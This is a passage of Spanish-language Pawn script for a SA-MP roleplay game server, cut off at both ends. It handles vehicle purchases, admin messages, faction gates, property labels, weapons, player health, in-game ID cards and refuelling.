	if(carid == -1)return Mensaje(jugador, COLOR_ROJO, "No hay vehiculos en venta.");
	if(obtenerDinero(jugador) < valor)return Mensaje(jugador, COLOR_ROJO, "Usted no posee esa cantidad de dinero.");

	new string[232];
	mysql_format(servidor[mysqlControl], string, sizeof(string), "SELECT * FROM zz_coches WHERE modelo = '%d';", false);
	mysql_query(servidor[mysqlControl], string, false);
	if(stockact >= stockmax)return Mensaje(jugador, COLOR_ROJO, "Este modelo esta agotado.");
	
	if(!cuenta[jugador][cCoche])
	{
		cuenta[jugador][cCoche] = carid;
	}
	else if(!cuenta[jugador][cCoche2])
	{
		cuenta[jugador][cCoche2] = carid;
	}
	else if(!cuenta[jugador][cCoche3] && cuenta[jugador][cDonador] >= 3)
	{
		cuenta[jugador][cCoche3] = carid;
	}
	else if(!cuenta[jugador][cCoche4] && cuenta[jugador][cDonador] >= 4)
	{
		cuenta[jugador][cCoche4] = carid;
	}else return Mensaje(jugador, COLOR_ROJO, "Ya posees un vehículo.");

	DestroyVehicle(carid);
	switch(GetPlayerVirtualWorld(jugador))
	{
		case 0:
		{
			carid = CreateVehicleEx(modelo, 534.5616, -1289.7535, 17.0329, 359.5526, 1, 1, VEHICULO_SPAWN);
		}
		case 1:
		{
			carid = CreateVehicleEx(modelo, 529.2825, -1290.0994, 16.9693, 0.7127, 1, 1, VEHICULO_SPAWN);
		}
		case 2:
		{
			carid = CreateVehicleEx(modelo, 524.0665, -1290.0736, 17.0739, 0.7460, 1, 1, VEHICULO_SPAWN);
		}
		case 3:
		{
			carid = CreateVehicleEx(modelo, 1926.4454, -2297.2805, 13.3786, 2.8863, 1, 1, VEHICULO_SPAWN);
			Mensaje(jugador, COLOR_ROJO, "IMPORTANTE:{FFFFFF} Su Avion/Helicoptero esta en el Aereopuerto de Los Santos.");
		}
	}
	
	//sistema de visualizacion.
	SalirVisualizacion(jugador, enteroChar[visual]{jugador});
	
    autos[carid][cModel] = modelo;
 	autos[carid][cOwned] = 1;
    autos[carid][cBattery] = 10000;
	autos[carid][cValue] = valor;
	autos[carid][cVehTime] = gettime() + 2160000;

	format(autos[carid][cOwner], 24, "%s", Nombre(jugador));
	format(autos[carid][cName], 24, "%s", CarName[modelo - 400]);
	
	//ZZCASH
	switch(cuenta[jugador][cDonador])
	{
		case 1:		pierdeDinero(jugador, valor - valor * 2  / 100);
		case 2:		pierdeDinero(jugador, valor - valor * 3  / 100);
		case 3:		pierdeDinero(jugador, valor - valor * 4  / 100);
		case 4:		pierdeDinero(jugador, valor - valor * 10 / 100);
		default:	pierdeDinero(jugador, valor);
	}

	SetVehicleParamsEx(carid, 0, 0, 0, 0, 0, 0, 0);
	vehiculoEncendido[carid] = false;
	ClearChatbox(jugador, 10);
	Mensaje(jugador, COLOR_VERDE, "Felicidades:{FFFFFF} Has adquirido este vehículo, utiliza (/vehiculo) para interactuar.");
	Mensaje(jugador, COLOR_VERDE, "INFO:{FFFFFF} Para ver los componentes/info del vehículo usa (/pcu).");
	Mensaje(jugador, COLOR_ROJO, "NOTA:{FFFFFF} Estacionalo antes de que sea embargado!");
	
	format(string, sizeof(string), "IMPORTANTE:{FFFFFF}Su vehiculo tiene %s dias de Impuestos PAGOS! Antes de completar dicho periodo debera realizar el pago nuevamente.", generarTiempo(autos[carid][cVehTime] - gettime()));
	Mensaje(jugador, COLOR_ROJO, string);
	
	Mensaje(jugador, COLOR_ROJO, "De lo contrario perdera su vehiculo sin posibilidad de regreso! Pagos en el Ayuntamiento!");
	
	ActualizaVehiculo(carid);
	return 1;
}
CallBack::AdminMensaje(string[])
{
    for(new i=0, _max=GetMaxPlayers();i<_max;i++)
	{
		if(IsPlayerConnected(i))
		{
			if (cuenta[i][cAdministrador] >= 1 && AdminChat[i] == 0)
			{
				Mensaje(i, 0xFF9562FF, string);
			}
		}
	}
	return 1;
}
CallBack::PlayerToPointStripped(Float:radi, playerid, Float:x, Float:y, Float:z, Float:curx, Float:cury, Float:curz)
{
    if(IsPlayerConnected(playerid))
	{
		new Float:tempposx, Float:tempposy, Float:tempposz;
		tempposx = (curx -x);
		tempposy = (cury -y);
		tempposz = (curz -z);
		if (((tempposx < radi) && (tempposx > -radi)) && ((tempposy < radi) && (tempposy > -radi)) && ((tempposz < radi) && (tempposz > -radi)))return 1;
	}
	return 0;
}
CallBack::MensajeAdmin(color, const string[], level)
{
	for(new i=0, t=GetMaxPlayers();i<t;i++)
	{
		if(IsPlayerConnected(i))
		{
			if(cuenta[i][cAdministrador] >= level && !AdminChat[i])
			{
				Mensaje(i, color, string);
			}
		}
	}
	return 1;
}
CallBack::MensajeAdmin2(color, const string[], level)
{
	for(new i=0, t=GetMaxPlayers();i<t;i++)
	{
		if(IsPlayerConnected(i))
		{
			if(cuenta[i][cAdministrador] >= level && !AdminChat[i] && booleano[AdminDuty]{i})
			{
				Mensaje(i, color, string);
			}
		}
	}
	return 1;
}
CallBack::ClearChatbox(playerid, lines)
{
	if (IsPlayerConnected(playerid))
	{
		for(new i=0; i<lines; i++)
		{
			Mensaje(playerid, COLOR_GRIS, "");
		}
	}
	return 1;
}
CallBack::CheckCarHealth()
{
    new string[128];
    for (new i=0, t=GetMaxPlayers(); i < t; i++)
    {
        if (IsPlayerConnected(i) && IsPlayerInAnyVehicle(i) && GetPlayerState(i) == PLAYER_STATE_DRIVER)
        {
             new Float:health;
             new newcar = GetPlayerVehicleID(i);
             GetVehicleHealth(newcar, health);
             if (health <= 500 && !EsBicicleta(newcar) && !IsAPlane(newcar))
             {
                 if(vehiculoEncendido[newcar])
                 {
                    if(GetPlayerState(i) == PLAYER_STATE_DRIVER)
                    {
						newcar = GetPlayerVehicleID(i);
                        new engine, lights, alarm, doors, bonnet, boot, objective;
                    	GetVehicleParamsEx(newcar, engine, lights, alarm, doors, bonnet, boot, objective);
                    	SetVehicleParamsEx(newcar, 0, lights, alarm, doors, bonnet, boot, objective);
                 		vehiculoEncendido[newcar] = false;
                 		format(string, sizeof(string), "* El vehiculo de %s se ha apagado bruscamente", PlayerName(i));
						ProxDetector(30.0, i, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
						Mensaje(i, COLOR_ROJO, "Su vehiculo se ha apagado bruscamente.");
					}
				}
			}
		}
    }
}
CallBack::VolverApostar(playerid)
{
	if(IsPlayerConnected(playerid))
	{
	    YaAposto[playerid] = 0;
 	}
	return 1;
}
CallBack::encenderMotor(playerid)
{
	new newcar = GetPlayerVehicleID(playerid);
	new string[70];
	new engine, lights, alarm, doors, bonnet, boot, objective;
	GetVehicleParamsEx(newcar, engine, lights, alarm, doors, bonnet, boot, objective);
	switch(random(8))
	{
		case 0 .. 6:
		{
			SetVehicleParamsEx(newcar, 1, lights, alarm, doors, bonnet, boot, objective);
			format(string, sizeof(string), "* %s enciende el motor de su vehículo.", PlayerName(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
			vehiculoEncendido[newcar] = true;
			TogglePlayerControllable(playerid, true);
		}
		case 7:
		{
			format(string, sizeof(string), "* %s no logró encender su vehículo.", PlayerName(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
			vehiculoEncendido[newcar] = false;
			TogglePlayerControllable(playerid, true);
		}
	}
	return 1;
}

CallBack::ClearKnock(playerid, targetid)
{
	new	string[128];
	if(IsPlayerConnected(playerid)){
		if(KnockedDown[playerid] == 1){
			KnockedDown[playerid] = 0, 
			format(string, sizeof(string), "* %s se recupera del golpe.", PlayerName(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
			ClearAnimations(playerid);
		}
		else KnockedDown[playerid] = 0;
	}
	
	if(IsPlayerConnected(targetid)){
		if(KnockedDown[targetid] == 1){
			KnockedDown[targetid] = 0, 
			format(string, sizeof(string), "* %s se recupera del golpe.", PlayerName(targetid));
			ProxDetector(30.0, targetid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
			ClearAnimations(targetid);
		}
		else KnockedDown[targetid] = 0;
	}
}
CallBack::RemovePlayerWeapon(playerid, weaponid)
{
	new plyWeapons[12] = 0;
	new plyAmmo[12] = 0;
	for(new slot = 0; slot != 12; slot++)
	{
		new wep, ammo;
		GetPlayerWeaponData(playerid, slot, wep, ammo);

		if(wep != weaponid && ammo != 0)
		{
			GetPlayerWeaponData(playerid, slot, plyWeapons[slot], plyAmmo[slot]);
		}
	}

	quitarArmas(playerid);
	for(new slot = 0; slot != 12; slot++)
	{
	    if(plyAmmo[slot] != 0)
	    {
			darArma(playerid, plyWeapons[slot], plyAmmo[slot]);
		}
	}
	return 1;
}

CallBack::quitarArmas(playerid)
{
	ResetPlayerWeapons(playerid);
	for(new i=0; i<13;i++)
	{
		detectarArmas[playerid][i][0] = 0;
		detectarArmas[playerid][i][1] = 0;
	}
	return 1;
}
CallBack::darArma(playerid, arma, balas)
{
	detectarArmas[playerid][GetWeaponSlot(arma)][0] = arma;
	detectarArmas[playerid][GetWeaponSlot(arma)][1] += balas;
	GivePlayerWeapon(playerid, detectarArmas[playerid][GetWeaponSlot(arma)][0], balas);
	return 1;
}

CallBack::EnableQuest(playerid){
	if(IsPlayerConnected(playerid)){
		booleano[duda]{playerid} = false;
	}
}

CallBack::ReportReset(playerid)
{
	if(IsPlayerConnected(playerid)){
		JustReported[playerid] = 0;
	}
}

CallBack::ReduceTimer(playerid){
	if(IsPlayerConnected(playerid)){
	    booleano[ReduceTime]{playerid} = false;
	}
}
 
CallBack::UnfreezePlayer(playerid)	{	TogglePlayerControllable(playerid, 1);	}

CallBack::CheckForOpenDoor(playerid)
{
	new nick[24];	GetPlayerName(playerid, nick, 24);
	if(Team_LSPD(playerid))
    {

        if (IsPlayerInRangeOfPoint(playerid, 10.0, 1806.3060, -1424.2159, 13.5433))
		{
      		SetDynamicObjectRot(pdgate1, -10.13995, -0.36000, 90.00000);
      		return 1;
		}
		else if (IsPlayerInRangeOfPoint(playerid, 15.0, 1545.7398681641, -1627.7280273438, 15.206203460693))
		{
      		MoveDynamicObject(pdgate2, 1545.7392578125, -1627.7275390625, 20.381204605103, 3.0, -1000.0, -1000.0, -1000.0);
      		return 1;
		}
		else Mensaje(playerid, COLOR_GRIS2, "No hay señal!");
	}
 	else if(Team_FBI(playerid))
 	{
 	    if(IsPlayerInRangeOfPoint(playerid, 20.0, 38.3064, -1031.1683, 31.8984))
 	    {
 	        SetDynamicObjectRot(fbibarra, 0.00, 26.00, 5.00);
 	        return 1;
 	    }
  	 else if(IsPlayerInRangeOfPoint(playerid, 20.0, 1124.96277, -1701.70605, 14.26070))
 	    {
 	        MoveDynamicObject(fbipuerta, 1133.78284, -1701.70605, 14.26070, 3.0, -1000.0, -1000.0, -1000.0);
 	        return 1;
 	    } else Mensaje(playerid, COLOR_GRIS2, "No hay señal!");
  	}
	else if(Team_Mecanicos(playerid))
	{
		if (IsPlayerInRangeOfPoint(playerid, 20.0, 2239.45117, -2219.99951, 14.02340))
  		{
	        MoveDynamicObject(meca1, 2239.45117, -2219.99951, 10.93301, 3.0, -1000.0, -1000.0, -1000.0);
	        return 1;
        }
     	if (IsPlayerInRangeOfPoint(playerid, 15.0, 1637.2500000, -2184.8000000, 12.5400000))
  		{
	        MoveDynamicObject(meca2, 2150.06543, -2248.08374, 14.38530, 0.00000, 0.00000, 134.79900);
	        return 1;
	    }
	    if (IsPlayerInRangeOfPoint(playerid, 20.0, 2179.1294, -2255.5129, 14.7734))
  		{
	        MoveDynamicObject(meca3, 2177.64404, -2255.89771, 20.16974, 3.0, 0.00000, 0.00000, 224.99297);
	        return 1;
	    } else Mensaje(playerid, COLOR_GRIS2, "No hay señal!");
	}

	else if(EsPeriodista(playerid))
    {
      	if (IsPlayerInRangeOfPoint(playerid, 30.0, 781.77209500, -1330.31884800, 12.68660500))
      	{
	       	MoveDynamicObject(tvp, 773.89648400, -1330.31884800, 12.68660500, 5.0, -1000.0, -1000.0, -1000.0);
	       	return 1;
       }
       else if (IsPlayerInRangeOfPoint(playerid, 30.0, 774.11425781, -1384.98632812, 12.92022705))
      	{
	       	MoveDynamicObject(tvp1, 765.11425781, -1384.98632812, 12.92022705, 5.0, -1000.0, -1000.0, -1000.0);
	       	return 1;
       }
       else Mensaje(playerid, COLOR_GRIS, "No hay señal!");
	}

	if(!strcmp(nick, "Charli_Navarro", true))
	{
	    if (IsPlayerInRangeOfPoint(playerid, 30.0, 1246.0033, -767.3727, 91.1473))
	    {
	        MoveDynamicObject(lucianogate, 1256.2033, -767.3727, 91.1473, 2.2, -1000.0, -1000.0, -1000.0);
	        return 1;
	    }
	}
	if(!strcmp(nick, "Tomas_Fissore", true))
	{
	    if (IsPlayerInRangeOfPoint(playerid, 30.0, 319.78, -1776.09, 6.60)){
	        MoveDynamicObject(fissore, 319.78, -1776.09, 0.66, 2.0, -1000.0, -1000.0, -1000.0);
	        return 1;
	    }
	}
 	else Mensaje(playerid, COLOR_AMARILLO, "En este instante usted no lleva un mando a distancia.");
    return 1;
}

CallBack::CheckForCloseDoor(playerid)
{
    new nick[24];	GetPlayerName(playerid, nick, 24);
	if(Team_LSPD(playerid))
    {
        if (IsPlayerInRangeOfPoint(playerid, 15.0, 1806.3060, -1424.2159, 13.5433))
		{
			SetDynamicObjectRot(pdgate1, -90.00000, 0.00000, 90.00000);
			return 1;
		}
		else if (IsPlayerInRangeOfPoint(playerid, 15.0, 1545.7398681641, -1627.7280273438, 15.206203460693))
		{
      		MoveDynamicObject(pdgate2, 1545.7398681641, -1627.7280273438, 15.206203460693, 3.0, -1000.0, -1000.0, -1000.0);
      		return 1;
		} else Mensaje(playerid, COLOR_GRIS, "No hay señal!");
	}
	else if(Team_Mecanicos(playerid))
	{
		if (IsPlayerInRangeOfPoint(playerid, 20.0, 2239.45117, -2219.99951, 14.02340))
  		{
	        MoveDynamicObject(meca1, 2239.45117, -2219.99951, 14.02340, 3.0, -1000.0, -1000.0, -1000.0);
	        return 1;
        }
     	if (IsPlayerInRangeOfPoint(playerid, 20.0, 1637.2500000, -2184.8000000, 12.5400000))
  		{
	        MoveDynamicObject(meca2, 2140.76318, -2256.65332, 12.28980, 0.00000, 0.00000, -45.00000);
	        return 1;
	    }
	    if (IsPlayerInRangeOfPoint(playerid, 20.0, 2179.1294, -2255.5129, 14.7734))
  		{
	        MoveDynamicObject(meca3, 2177.64404, -2255.89771, 16.55646, 3.0, 0.00000, 0.00000, 224.99297);
	        return 1;
	    } else Mensaje(playerid, COLOR_GRIS2, "No hay señal!");
	}
	else if(Team_FBI(playerid))
 	{
 	    if(IsPlayerInRangeOfPoint(playerid, 20.0, 938.3064, -1031.1683, 31.8984))
 	    {
 	        SetDynamicObjectRot(fbibarra, 0.00, 90.00, 358.10);
 	        return 1;
 	    }
 	    else if(IsPlayerInRangeOfPoint(playerid, 20.0, 1124.96277, -1701.70605, 14.26070))
 	    {
 	        MoveDynamicObject(fbipuerta, 1124.96277, -1701.70605, 14.26070, 3.0, -1000.0, -1000.0, -1000.0);
 	        return 1;
 	    }
		  else Mensaje(playerid, COLOR_GRIS2, "No hay señal!");
  	}
	else if(EsPeriodista(playerid))
    {
   		if (IsPlayerInRangeOfPoint(playerid, 20.0, 781.77209500, -1330.31884800, 12.68660500))
      	{
	       	MoveDynamicObject(tvp, 781.77209500, -1330.31884800, 12.68660500, 5.0, -1000.0, -1000.0, -1000.0);
	       	return 1;
     	}
       else if (IsPlayerInRangeOfPoint(playerid, 20.0, 774.11425781, -1384.98632812, 12.92022705))
		{
	       	MoveDynamicObject(tvp1, 774.11425781, -1384.98632812, 12.92022705, 5.0, -1000.0, -1000.0, -1000.0);
	       	return 1;
  		}
       else Mensaje(playerid, COLOR_GRIS, "No hay señal!");
	}
	if(!strcmp(nick, "Charli_Navarro", true))
	{
	    if (IsPlayerInRangeOfPoint(playerid, 30.0, 1246.0033, -767.3727, 91.1473))
	    {
	        MoveDynamicObject(lucianogate, 1246.0033, -767.3727, 91.1473, 1.5, -1000.0, -1000.0, -1000.0);
	        return 1;
	    }
	}
	if(!strcmp(nick, "Tomas_Fissore", true))
	{
	    if (IsPlayerInRangeOfPoint(playerid, 30.0, 319.78, -1776.09, 6.60)){
	        MoveDynamicObject(fissore, 319.78, -1776.09, 6.60, 2.0, -1000.0, -1000.0, -1000.0);
	        return 1;
	    }
	}
	else Mensaje(playerid, COLOR_GRIS, "Usted no tiene un mando a distancia.");
    return 1;
}
CallBack::OnGlobalPropTextdrawUpdate()
{
	for(new h = 0; h < sizeof(casa); h++)
	{
        OnPropTextdrawUpdate(h);
	}
	return 1;
}
CallBack::OnPropTextdrawUpdate(hid){
	new string[256];
	if(!casa[hid][hOwned]){
 		DestroyDynamic3DTextLabel(casa[hid][h3DText]);
		DestroyDynamicPickup(casa[hid][hPickup]);
  		format(string, sizeof(string), "{00FF00}Casa en Venta\n\n{FFFFFF}Precio: %d$\nNivel: %d", casa[hid][hValue], casa[hid][hLevel]);
    	casa[hid][h3DText] = CreateDynamic3DTextLabel(string, COLOR_BLANCO, casa[hid][hEntrancex], casa[hid][hEntrancey], casa[hid][hEntrancez], 6.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, 0);
		casa[hid][hPickup] = CreateDynamicPickup(1273, 1, casa[hid][hEntrancex], casa[hid][hEntrancey], casa[hid][hEntrancez]);
	}else{
 		DestroyDynamicPickup(casa[hid][hPickup]);
		casa[hid][hPickup] = CreateDynamicPickup(1239, 1, casa[hid][hEntrancex], casa[hid][hEntrancey], casa[hid][hEntrancez]);
		
		DestroyDynamic3DTextLabel(casa[hid][h3DText]);
      	format(string, sizeof(string), "{00FF00}%s\n\n{FFFFFF}Propietario: %s\nUbicacion: %s", casa[hid][hNombre], casa[hid][hOwner], casa[hid][hUbicacion]);
		casa[hid][h3DText] = CreateDynamic3DTextLabel(string, COLOR_BLANCO, casa[hid][hEntrancex], casa[hid][hEntrancey], casa[hid][hEntrancez], 6.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, 0);
	}
	return 1;
}

CallBack::OnGlobalBizzTextdrawUpdate(){
    for(new i=0;i<sizeof(negocio);i++){
	    OnBizzTextdrawUpdate(i);
 	}
 	return 1;
}

CallBack::OnBizzTextdrawUpdate(bid){
    new string[164];
	if(!negocio[bid][bOwned]){
 		DestroyDynamic3DTextLabel(negocio[bid][b3DText]);
  		DestroyDynamicPickup(negocio[bid][bPickup]);
   		format(string, sizeof(string), "{868FD9}%s\n\n{ffffff}Valor: %d\nNivel: %d\nUbicacion: %s", negocio[bid][bName], negocio[bid][bBuyPrice], negocio[bid][bLevelNeeded], negocio[bid][bUbicacion]);
		negocio[bid][b3DText] = CreateDynamic3DTextLabel(string, 0xFFFFFFFF, negocio[bid][bEntrancex], negocio[bid][bEntrancey], negocio[bid][bEntrancez], 5.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, 0);
		negocio[bid][bPickup] = CreateDynamicPickup(1272, 1, negocio[bid][bEntrancex], negocio[bid][bEntrancey], negocio[bid][bEntrancez]);
	}else{
 		DestroyDynamic3DTextLabel(negocio[bid][b3DText]);
  		DestroyDynamicPickup(negocio[bid][bPickup]);
   		format(string, sizeof(string), "{868FD9}%s\n\n{ffffff}[%s]\nDueño: %s\nExtorsionista: %s\nUbicacion: %s", negocio[bid][bName], negocio[bid][bEmpresa], negocio[bid][bOwner], negocio[bid][bExtortion], negocio[bid][bUbicacion]);
		negocio[bid][b3DText] = CreateDynamic3DTextLabel(string, 0xFFFFFFFF, negocio[bid][bEntrancex], negocio[bid][bEntrancey], negocio[bid][bEntrancez], 5.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, 0);
		negocio[bid][bPickup] = CreateDynamicPickup(1272, 1, negocio[bid][bEntrancex], negocio[bid][bEntrancey], negocio[bid][bEntrancez]);
	}
	return 1;
}

CallBack::ShootAgain(playerid)
{
	Bowling[playerid] = 0;
    BowlingMoney[playerid] = 0;
}

CallBack::SetPlayerStats(playerid)
{
	SetPlayerSkillLevel(playerid, WEAPONSKILL_DESERT_EAGLE, cuenta[playerid][cDesert]);
	SetPlayerSkillLevel(playerid, WEAPONSKILL_SHOTGUN, cuenta[playerid][cEscopeta]);
	SetPlayerSkillLevel(playerid, WEAPONSKILL_MP5, cuenta[playerid][cMP5]);
	SetPlayerSkillLevel(playerid, WEAPONSKILL_AK47, cuenta[playerid][cAK47]);
	SetPlayerSkillLevel(playerid, WEAPONSKILL_M4, cuenta[playerid][cM4]);
	SetPlayerSkillLevel(playerid, WEAPONSKILL_SNIPERRIFLE, cuenta[playerid][cSniper]);
	SetPlayerSkillLevel(playerid, WEAPONSKILL_PISTOL, 300);
	SetPlayerSkillLevel(playerid, WEAPONSKILL_SPAS12_SHOTGUN, 300);
	
	SetPlayerFightingStyle(playerid, cuenta[playerid][cEstiloPelea]);
	SetPlayerWalkingStyle(playerid, cuenta[playerid][cCaminar]);
	return 1;
}

CallBack::CheckVida()
{
	for(new i=0, t=GetMaxPlayers();i<t;i++)
	{
	    if(IsPlayerConnected(i) && booleano[gIngreso]{i})
		{
			new Float:Life;
	        GetPlayerHealth(i, Life);
			if(!Life) continue;
			if(Life < 15.1)
			{
				if(IsPlayerInAnyVehicle(i))
				{
					GetPlayerHealth(i, Life);
					SetHP(i, Life-1.0);
				}
				if(!booleano[MensajeMuriendo]{i} && booleano[gIngreso]{i})
				{
				    if(!IsPlayerInAnyVehicle(i))
					{
						Mensaje(i, COLOR_ROJO3, "Tu estado actual es crítico. Te estás muriendo!");
						Mensaje(i, COLOR_ROJO3, "Ojalá alguien pueda llamar a una ambulancia, y rápido!");
						Mensaje(i, COLOR_ROJO3, "Si no es así, morirás en poco tiempo!");
           				ApplyAnimation(i, "CRACK", "crckdeth1", 2.5, 1, 0, 1, 0, 0);
						booleano[MensajeMuriendo]{i} = true;
						if(!booleano[MsgL4L]{i})
						{
						    if(Life < 16 && Life > 12){ Left4Life[i] = 180; }
						    if(Life < 13 && Life > 8){ Left4Life[i] = 149; }
						    if(Life <  9){ Left4Life[i] = 99; }
							booleano[MsgL4L]{i} = true;
						}
					}
				    if(IsPlayerInAnyVehicle(i))
					{
						Mensaje(i, COLOR_ROJO3, "Tu estado actual es crítico. Te estás muriendo!");
						Mensaje(i, COLOR_ROJO3, "Si sigues en el coche tu vida disminuairá más rapido!");
						Mensaje(i, COLOR_ROJO3, "Intenta bajar inmediatamente!");
						booleano[MensajeMuriendo]{i} = true;
					}
				}
			}
			else
			{
				booleano[MensajeMuriendo]{i} = false;
				booleano[MsgL4L]{i} = false;
				Left4Life[i] = 0;
			}
		}
	}
	return 1;
}

CallBack::NewUs(playerid)
{
	booleano[NewUsed]{playerid} = false;
	return 1;
}

CallBack::Reg_ShowDNI(playerid){ MostrarIdentidad(playerid, playerid); }

CallBack::MostrarIdentidad(playerid, targetid)
{
    if(IsPlayerConnected(playerid)&&IsPlayerConnected(targetid))
	{
	    new string[64], sex[2];
	    if(cuenta[playerid][cSexo] == 1){ sex = "M"; }
   		else								{ sex = "F"; }

	    Mensaje(targetid, 0x0D86FFFF, "|___________ Documento Nacional de Identidad ___________|");
   		format(string, sizeof(string), "   Nombre: %s", PlayerName(playerid));
   		Mensaje(targetid, COLOR_BLANCO, string);
   		format(string, sizeof(string), "   Sexo: %s", sex);
   		Mensaje(targetid, COLOR_BLANCO, string);
   		format(string, sizeof(string), "   Edad: %d     Fecha Nacimiento: %d", cuenta[playerid][cEdad], 2012-cuenta[playerid][cEdad]);
   		Mensaje(targetid, COLOR_BLANCO, string);
   		if(cuenta[playerid][cCasado] == 1) format(string, sizeof(string), "   Estado Civil: Casado			Con: %s", cuenta[playerid][cPareja]);
		else format(string, sizeof(string), "   Estado Civil: Soltero");
   		Mensaje(targetid, COLOR_BLANCO, string);
   		format(string, sizeof(string), "   Nacionalidad: %s", PlayerStatInfo[playerid][1]);
   		Mensaje(targetid, COLOR_BLANCO, string);
   		format(string, sizeof(string), "   Nº DNI: %d", cuenta[playerid][cIdentificacion]);
   		Mensaje(targetid, COLOR_BLANCO, string);
   		format(string, sizeof(string), "   IDSA%d%s<%s>%d-%d", cuenta[playerid][cIdentificacion], sex, PlayerName(playerid), 2012-cuenta[playerid][cEdad], cuenta[playerid][cEdad]);
   		Mensaje(targetid, COLOR_GRIS2, string);
   		Mensaje(targetid, 0x0D86FFFF, "|_________________ ·------------------------------· _________________|");
	}
}

CallBack::ShowDNIFalse(playerid, targetid)
{
    if(IsPlayerConnected(playerid)&&IsPlayerConnected(targetid))
	{
	    new string[64], sex[2];
	    if(cuenta[playerid][cSexo] == 1){ sex = "M"; }
   		else								{ sex = "F"; }

	    Mensaje(targetid, 0x0D86FFFF, "|___________ Documento Nacional de Identidad ___________|");
   		format(string, sizeof(string), "   Nombre: %s", cuenta[playerid][cIdentificacionName]);
   		Mensaje(targetid, COLOR_BLANCO, string);
   		format(string, sizeof(string), "   Sexo: %s", sex);
   		Mensaje(targetid, COLOR_BLANCO, string);
   		format(string, sizeof(string), "   Edad: %d     Fecha Nacimiento: %d", cuenta[playerid][cEdad], 2012-cuenta[playerid][cEdad]);
   		Mensaje(targetid, COLOR_BLANCO, string);
   		format(string, sizeof(string), "   Estado Civil: Soltero");
   		Mensaje(targetid, COLOR_BLANCO, string);
   		format(string, sizeof(string), "   Nacionalidad: %s", PlayerStatInfo[playerid][1]);
   		Mensaje(targetid, COLOR_BLANCO, string);
   		format(string, sizeof(string), "   Nº DNI: %d", cuenta[playerid][cIdentificacionFalse]);
   		Mensaje(targetid, COLOR_BLANCO, string);
   		format(string, sizeof(string), "   IDSA%d%s<%s>%d-%d", cuenta[playerid][cIdentificacionFalse], sex, cuenta[playerid][cIdentificacionFalse], 2012-cuenta[playerid][cEdad], cuenta[playerid][cEdad]);
   		Mensaje(targetid, COLOR_GRIS2, string);
   		Mensaje(targetid, 0x0D86FFFF, "|_________________ ·------------------------------· _________________|");
	}
}

CallBack::llenarAuto(playerid)
{
	new string[128], vehicle = GetPlayerVehicleID(playerid);
	if(Gas[vehicle] >= 900)return Mensaje(playerid, COLOR_ROJO, "Este vehiculo no necesita gasolina.");
	if(vehiculoEncendido[vehicle])return Mensaje(playerid, COLOR_ROJO, "Debe apagar su auto para poder llenar el tanque.");
	TogglePlayerControllable(playerid, false);
	format(string, sizeof(string), "* %s agarra la mangera y la introduce en el depósito.", PlayerName(playerid));
	ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
	Mensaje(playerid, COLOR_BLANCO, "El vehículo se está llenando, espera...");
	SetTimerEx("llenarTanque", MAX_TIEMPO_ESPERA_GASOLINA, false, "i", playerid);
	return 1;
}

CallBack::MM_Noise()
{
    for(new i=0, _max=GetMaxPlayers();i<_max;i++)
	{
		if(IsPlayerInRangeOfPoint(i, 20.0, 1641.2056, -2139.6641, 13.4100))
		{
		    PlayerPlaySound(i, 1133, 1641.2056, -2139.6641, 13.4100);
		}
	}
}

CallBack::vehiculoExamen(playerid)
{
	new vehicle = GetPlayerVehicleID(playerid), Gasolina[32];
	if(!EsComprable(vehicle))return Mensaje(playerid, COLOR_ROJO, "No es un vehiculo que puedas examinar.");
	
	switch(autos[vehicle][cGas])
	{
		case 1000: Gasolina = "6  Cilindros - 1000 litros";
		case 1500: Gasolina = "8  Cilindros - 1500 litros";
		case 2000: Gasolina = "10 Cilindros - 2000 litros";
		case 2500: Gasolina = "12 Cilindros - 2500 litros";
	}

	new string[96];
	ClearChatbox(playerid, 20);
	format(string, sizeof(string), "___________|%s|___________", autos[vehicle][cName]);
	Mensaje(playerid, COLOR_AZUL, string);
	format(string, sizeof(string), "  Motor: %s", Gasolina);
	Mensaje(playerid, COLOR_BLANCO, string);
	format(string, sizeof(string), "	Batería: %d Watts", autos[vehicle][cBattery]);
	Mensaje(playerid, COLOR_BLANCO, string);
	format(string, sizeof(string), "  Gasolina: %d litros", Gas[vehicle]);
	Mensaje(playerid, COLOR_BLANCO, string);
	KillTimer(mmtimer);
	return 1;
}

CallBack::llenarTanque(playerid)
{
    if(IsPlayerInAnyVehicle(playerid) && IsPlayerConnected(playerid))
   	{
   	    new vehicle = GetPlayerVehicleID(playerid);
		new gasolina = (LlaveVehicular(playerid, vehicle))?(autos[vehicle][cGas] - Gas[vehicle]):(1000 - Gas[vehicle]);
		new precio = gasolina * 2;
		
		TogglePlayerControllable(playerid, true);
		if(EsCochePolicial(vehicle) || SAMD_Vehicle(vehicle))
		{
			GameTextForPlayer(playerid, "~g~0$", 5000, 1);
			Mensaje(playerid, COLOR_BLANCO, "** Tu empresa se hace responsable de los gastos");
			Gas[vehicle] += gasolina;
		}
		else
		{
			if(obtenerDinero(playerid) < precio)return Mensaje(playerid, COLOR_GRIS2, "Usted no tiene suficiente dinero para llenar su auto.");
			Gas[vehicle] += gasolina;
			pierdeDinero(playerid, precio);
		}
		
		new string[126];
		ClearChatbox(playerid, 20);
		Mensaje(playerid, 0x0097DFFF, "|_________|Gasolina - Recibo|_________|");
		format(string, sizeof(string), " Precio: 2$ por LITRO");
		Mensaje(playerid, COLOR_BLANCO, string);
		format(string, sizeof(string), " Pagado: %d litros", gasolina);
		Mensaje(playerid, COLOR_BLANCO, string);
